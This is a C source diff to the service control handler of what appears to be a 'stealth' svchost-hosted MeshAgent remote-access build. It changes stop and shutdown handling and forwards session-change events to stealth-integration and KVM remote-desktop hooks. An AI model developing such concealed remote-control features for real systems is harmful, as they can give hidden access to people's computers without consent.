@@ -15,6 +15,7 @@
 #include <sddl.h>
 #include <strsafe.h>
 #include "stealth.h"
+#include "stealth_integration.h"
 #include "stealth_utils.h"
 #include "stealth_defaults.h"
 #include "service_security.h"
@@ -1054,7 +1055,6 @@ DWORD WINAPI Stealth_SvchostCtrlHandler(
     LPVOID lpEventData,
     LPVOID lpContext)
 {
-    UNREFERENCED_PARAMETER(lpEventData);
     UNREFERENCED_PARAMETER(lpContext);
 
     switch (dwControl)
@@ -1079,12 +1079,8 @@ DWORD WINAPI Stealth_SvchostCtrlHandler(
             if (g_SvchostAgent != NULL)
             {
                 MeshAgent_Stop(g_SvchostAgent);
-                g_SvchostAgent = NULL;
             }
-
-            g_SvchostStatus.dwCurrentState = SERVICE_STOPPED;
-            g_SvchostStatus.dwCheckPoint = 0;
-            g_SvchostStatus.dwWaitHint = 0;
+            Stealth_SvchostLogLine(L"Stop requested; waiting for MeshAgent_Start to return");
             SetServiceStatus(g_SvchostStatusHandle, &g_SvchostStatus);
 
             return NO_ERROR;
@@ -1100,12 +1096,8 @@ DWORD WINAPI Stealth_SvchostCtrlHandler(
             if (g_SvchostAgent != NULL)
             {
                 MeshAgent_Stop(g_SvchostAgent);
-                g_SvchostAgent = NULL;
             }
-
-            g_SvchostStatus.dwCurrentState = SERVICE_STOPPED;
-            g_SvchostStatus.dwCheckPoint = 0;
-            g_SvchostStatus.dwWaitHint = 0;
+            Stealth_SvchostLogLine(L"Shutdown requested; waiting for MeshAgent_Start to return");
             SetServiceStatus(g_SvchostStatusHandle, &g_SvchostStatus);
 
             return NO_ERROR;
@@ -1137,8 +1129,27 @@ DWORD WINAPI Stealth_SvchostCtrlHandler(
             return NO_ERROR;
 
         case SERVICE_CONTROL_SESSIONCHANGE:
-            // Handle session changes if needed
+        {
+            DWORD sessionId = 0;
+            if (lpEventData != NULL)
+            {
+                WTSSESSION_NOTIFICATION* sessionNotification = (WTSSESSION_NOTIFICATION*)lpEventData;
+                if (sessionNotification->cbSize >= sizeof(WTSSESSION_NOTIFICATION))
+                {
+                    sessionId = sessionNotification->dwSessionId;
+                }
+            }
+
+#ifdef MESHAGENT_ENABLE_STEALTH
+            StealthIntegration_HandleSessionChange(dwEventType, sessionId);
+#endif
+#if defined(_LINKVM)
+            Stealth_DebugPrintfA("[svchost] Forwarding KVM session change event=%lu session=%lu", (unsigned long)dwEventType, (unsigned long)sessionId);
+            Stealth_SvchostLogLine(L"Forwarding KVM session change event=%lu session=%lu", (unsigned long)dwEventType, (unsigned long)sessionId);
+            kvm_notify_session_change(dwEventType, sessionId);
+#endif
             return NO_ERROR;
+        }
 
         default:
             return ERROR_CALL_NOT_IMPLEMENTED;
